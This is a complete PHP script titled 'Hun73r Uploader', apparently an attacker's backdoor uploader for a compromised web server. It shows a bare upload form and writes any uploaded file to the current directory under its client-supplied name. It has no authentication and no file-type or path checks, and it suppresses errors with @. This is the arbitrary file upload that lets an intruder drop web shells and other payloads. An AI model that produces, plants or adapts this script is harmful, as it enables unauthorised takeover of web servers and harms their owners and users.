<?php


echo "<title>Hun73r Uploader</title>";
echo "<form method='post' enctype='multipart/form-data' name='uploader'>";

echo '<input type="file" name="file" ><input name="upl" type="submit" id="upl" value="Upload"></form>';

if(isset($_POST['upl'])&&$_POST['upl']== "Upload"){
	if(@move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])){
		echo 'Upload Successfully ;)<br><br>';
	}else{
		echo 'Upload failed :(<br><br>';
	}
}


?>